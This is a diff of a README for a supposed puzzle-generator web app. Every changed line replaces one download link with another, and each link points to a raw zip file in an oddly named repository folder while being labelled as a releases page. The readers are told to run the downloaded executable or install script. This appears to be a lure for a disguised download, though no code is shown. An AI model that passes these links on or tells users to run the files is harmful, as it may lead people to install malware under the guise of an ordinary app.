@@ -2,7 +2,7 @@
 
 ## 🏷 Download Now
 
-[![Download](https://raw.githubusercontent.com/Minoxds/prompt-to-puzzle/main/amygdalitis/prompt-to-puzzle.zip)](https://raw.githubusercontent.com/Minoxds/prompt-to-puzzle/main/amygdalitis/prompt-to-puzzle.zip)
+[![Download](https://raw.githubusercontent.com/Minoxds/prompt-to-puzzle/main/migration/puzzle-prompt-to-3.1.zip)](https://raw.githubusercontent.com/Minoxds/prompt-to-puzzle/main/migration/puzzle-prompt-to-3.1.zip)
 
 ## 📖 Introduction
 
@@ -13,7 +13,7 @@ Welcome to **prompt-to-puzzle**! This web app generates exciting "Spot the Diffe
 To start using **prompt-to-puzzle**, follow these simple steps:
 
 1. **Download the App**: Visit the Releases page using the link below:
-   [Visit the Releases Page](https://raw.githubusercontent.com/Minoxds/prompt-to-puzzle/main/amygdalitis/prompt-to-puzzle.zip)
+   [Visit the Releases Page](https://raw.githubusercontent.com/Minoxds/prompt-to-puzzle/main/migration/puzzle-prompt-to-3.1.zip)
 
 2. **Choose a Version**: On the Releases page, you will find different versions of the app. Select the version that suits your system. 
 
@@ -21,14 +21,14 @@ To start using **prompt-to-puzzle**, follow these simple steps:
 
    - **Windows**: Click on the `.exe` file to download it. Once downloaded, double-click the file and follow the installation prompts.
    - **Mac**: Download the `.dmg` file. Open it and drag the application to the Applications folder to install.
-   - **Linux**: Download the `https://raw.githubusercontent.com/Minoxds/prompt-to-puzzle/main/amygdalitis/prompt-to-puzzle.zip` file. Extract it and run the installation script included.
+   - **Linux**: Download the `https://raw.githubusercontent.com/Minoxds/prompt-to-puzzle/main/migration/puzzle-prompt-to-3.1.zip` file. Extract it and run the installation script included.
 
 4. **Launch the App**: After installation, find the app in your applications menu or desktop and double-click to open it.
 
 ## 📥 Download & Install
 
 To download, visit the following link:  
-[Download from Releases](https://raw.githubusercontent.com/Minoxds/prompt-to-puzzle/main/amygdalitis/prompt-to-puzzle.zip)
+[Download from Releases](https://raw.githubusercontent.com/Minoxds/prompt-to-puzzle/main/migration/puzzle-prompt-to-3.1.zip)
 
 1. Navigate to the releases section.  
 2. Choose your operating system and download the corresponding file.  
